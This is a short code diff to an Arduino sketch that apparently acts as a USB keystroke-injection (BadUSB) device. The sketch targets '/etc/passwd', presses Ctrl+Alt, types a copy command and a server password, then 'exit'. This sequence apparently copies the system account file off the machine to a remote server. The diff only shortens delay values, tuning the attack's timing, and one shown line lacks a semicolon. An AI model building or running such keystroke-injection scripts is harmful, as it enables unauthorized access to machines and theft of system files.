@@ -12,7 +12,7 @@ void setup() {
 
   String path = "/etc/passwd"
 
-    delay(2137);
+    delay(600);
     Keyboard.press(KEY_LEFT_CTRL);
     delay(600);
     Keyboard.press(KEY_LEFT_ALT);
@@ -26,7 +26,7 @@ void setup() {
     Keyboard.println(copyCommand);
     delay(600);
     Keyboard.println(server_password);
-    delay(2137);
+    delay(600);
     Keyboard.println("exit");
     delay(600);
     Keyboard.end();
